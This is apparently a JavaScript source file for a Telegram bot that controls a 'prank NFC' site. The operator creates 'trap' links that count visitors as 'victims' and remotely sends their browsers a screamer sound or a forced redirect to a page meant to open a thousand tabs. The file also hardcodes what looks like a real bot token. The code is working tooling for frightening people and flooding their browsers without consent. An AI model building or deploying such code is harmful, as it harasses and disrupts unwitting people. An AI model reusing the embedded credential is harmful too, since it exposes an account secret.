/**
 * NFC LOGIC BOT - Окремий модуль керування
 * Цей файл підключається до server.js і керує глобальними змінними
 */

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- НАЛАШТУВАННЯ ---
// Встав сюди токен від @BotFather
const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; 

// Ініціалізація бота
const bot = new TelegramBot(token, { polling: true });

// Шлях для збереження файлів (має співпадати з server.js)
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');

// Тимчасове сховище для створення пастки (Wizard)
const wizardState = {};

// --- ДОПОМІЖНІ ФУНКЦІЇ ---

// Генератор короткого коду (як у server.js)
function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}

// Завантаження файлів з Telegram на сервер
async function downloadTelegramFile(fileId, type) {
    try {
        const fileLink = await bot.getFileLink(fileId);
        const ext = path.extname(fileLink);
        const filename = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
        const filePath = path.join(UPLOAD_DIR, filename);

        const writer = fs.createWriteStream(filePath);
        const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
        response.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => resolve({
                filename: filename,
                url: `/uploads/${filename}`, // Публічний шлях для браузера
                fullPath: filePath
            }));
            writer.on('error', reject);
        });
    } catch (e) {
        console.error('Download Error:', e);
        return null;
    }
}

// --- ЛОГІКА БОТА ---

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "📡 **NFC LOGIC CONTROL** 📡\n\nСистема готовая к работе.", {
        parse_mode: 'Markdown',
        reply_markup: {
            keyboard: [
                ['💀 Создать нфс', '🎛 Мои прошлые нфс'],
                ['ℹ️ Статус сервера']
            ],
            resize_keyboard: true,
            one_time_keyboard: false
        }
    });
});

// Обробка текстових повідомлень (Меню + Wizard)
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // 1. Команди меню
    if (text === '💀 Создать нфс') {
        wizardState[chatId] = { step: 1, data: {} };
        return bot.sendMessage(chatId, "ШАГ 1/2: Скинь **картинку** для сайта (или напишы 'skip' для стандарта):", { parse_mode: 'Markdown' });
    }

    if (text === '🎛 Мои прошлые нфс') {
        if (!global.sessions) return bot.sendMessage(chatId, "❌ Сервер еще не инициализировал сесии.");
        
        const sessions = Object.values(global.sessions);
        if (sessions.length === 0) return bot.sendMessage(chatId, "📭 Активных сесссий еще нет.");

        // Показуємо останні 5 сесій
        sessions.slice(-5).forEach(s => sendSessionControl(chatId, s.id));
        return;
    }

    if (text === 'ℹ️ Статус сервера') {
        const victimCount = Object.keys(global.activeVictims || {}).length;
        const sessionCount = Object.keys(global.sessions || {}).length;
        return bot.sendMessage(chatId, `📊 **SERVER STATUS**\n\n🟢 Online Victims: ${victimCount}\n📁 Active Sessions: ${sessionCount}\n⚡️ Node.js: Running`);
    }

    // 2. Логіка Wizard (Створення пастки)
    if (wizardState[chatId]) {
        const step = wizardState[chatId].step;

        // Обробка КАРТИНКИ
        if (step === 1) {
            if (msg.photo) {
                bot.sendMessage(chatId, "⏳ ща будет...");
                const file = await downloadTelegramFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                wizardState[chatId].data.image = file.url;
            } else if (text === 'skip') {
                wizardState[chatId].data.image = null; // Використає дефолтну з клієнта
            } else {
                return bot.sendMessage(chatId, "⚠️ дай ФОТО или 'skip'");
            }
            
            wizardState[chatId].step = 2;
            return bot.sendMessage(chatId, "ШАГ 2/2: Кинь **звук** (скример) или голосовуху (или 'skip'):", { parse_mode: 'Markdown' });
        }

        // Обробка ЗВУКУ
        if (step === 2) {
            if (msg.audio || msg.voice) {
                bot.sendMessage(chatId, "⏳ Ам-ам-ам аам амамам...");
                const fileId = msg.audio ? msg.audio.file_id : msg.voice.file_id;
                const file = await downloadTelegramFile(fileId, 'snd');
                wizardState[chatId].data.sound = file.url;
            } else if (text === 'skip') {
                wizardState[chatId].data.sound = null;
            } else {
                return bot.sendMessage(chatId, "⚠️ чзх. Аудио кинь 'skip'");
            }

            // ФІНАЛІЗАЦІЯ - Створення сесії в пам'яті сервера
            finishCreation(chatId, wizardState[chatId].data);
            delete wizardState[chatId];
        }
    }
});

// Функція створення сесії в глобальному об'єкті server.js
function finishCreation(chatId, data) {
    const id = uuidv4();
    const shortCode = generateShortCode(); // Генеруємо код

    // Створення об'єкта сесії (має збігатися зі структурою server.js)
    const newSession = {
        id: id,
        shortCode: shortCode,
        image: data.image || '', // Шлях до файлу
        sound: data.sound || '', // Шлях до файлу
        autoMode: true,
        totalVictims: 0,
        createdAt: new Date(),
        creatorId: chatId // Запам'ятовуємо, хто створив
    };

    // ЗАПИС У ГЛОБАЛЬНІ ЗМІННІ СЕРВЕРА
    if (global.sessions) global.sessions[id] = newSession;
    if (global.shortLinks) global.shortLinks[shortCode] = id;

    bot.sendMessage(chatId, "✅ **Пастку створено!**");
    sendSessionControl(chatId, id);
}

// Надсилання панелі керування
function sendSessionControl(chatId, sessionId) {
    const session = global.sessions[sessionId];
    if (!session) return;
    
    // Припускаємо, що домен ми знаємо або беремо IP
    const link = `https://prank-nfc.onrender.com/${session.shortCode}`; 
    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId).length;

    const msgText = `🆔 ID: \`${sessionId.split('-')[0]}\`\n🔗 Link: \`${link}\`\n👥 Victims: ${victims}\n🔄 Auto: ${session.autoMode ? 'ON' : 'OFF'}`;

    bot.sendMessage(chatId, msgText, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🔊 СКРИМЕР", callback_data: `scare_${sessionId}` },
                    { text: "☢️ BOMBARDIO", callback_data: `bomb_${sessionId}` }
                ],
                [
                    { text: "🔄 Auto Mode", callback_data: `auto_${sessionId}` },
                    { text: "❌ Удалить", callback_data: `del_${sessionId}` }
                ]
            ]
        }
    });
}

// --- ОБРОБКА КНОПОК (CALLBACKS) ---

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const [action, sessionId] = query.data.split('_');

    // Перевірка чи існує сесія (крім видалення)
    if (!global.sessions[sessionId] && action !== 'del') {
        return bot.answerCallbackQuery(query.id, { text: "тут ктото ест?!" });
    }

    const session = global.sessions[sessionId];

    switch (action) {
        case 'scare':
            // Використовуємо GLOBAL IO з server.js
            if (global.io) {
                global.io.to(sessionId).emit('play-sound');
                bot.answerCallbackQuery(query.id, { text: "уххх пайдеет щас вазня" });
            }
            break;

        case 'bomb':
            if (global.io) {
                // Посилаємо команду на відкриття 1000 вкладок (приклад URL)
                global.io.to(sessionId).emit('force-redirect', { 
                    url: "https://prank-nfc.onrender.com/bomb.html" // Або твоє посилання
                });
                bot.answerCallbackQuery(query.id, { text: "☢️ Оййй ну все минус сифон!" });
            }
            break;

        case 'auto':
            session.autoMode = !session.autoMode;
            // Оновлюємо стан на клієнтах
            if (global.io) {
                global.io.to(sessionId).emit('update-media', { 
                    sound: session.sound, 
                    image: session.image,
                    auto: session.autoMode 
                });
            }
            // Оновлюємо текст кнопки (перемальовуємо клавіатуру)
            bot.editMessageText(`🆔 ID: \`${sessionId.split('-')[0]}\`\n🔗 Link: ...\n🔄 Auto: ${session.autoMode ? 'ON' : 'OFF'}`, {
                chat_id: chatId,
                message_id: query.message.message_id,
                parse_mode: 'Markdown',
                reply_markup: query.message.reply_markup
            });
            bot.answerCallbackQuery(query.id, { text: `Auto Mode: ${session.autoMode}` });
            break;

        case 'del':
            // Видаляємо з глобальної пам'яті
            if (session) {
                if (global.shortLinks) delete global.shortLinks[session.shortCode];
                delete global.sessions[sessionId];
            }
            bot.deleteMessage(chatId, query.message.message_id);
            bot.answerCallbackQuery(query.id, { text: "Сесію видалено." });
            break;
    }
});

console.log("✅ NFC Logic Bot loaded and linked to server.");
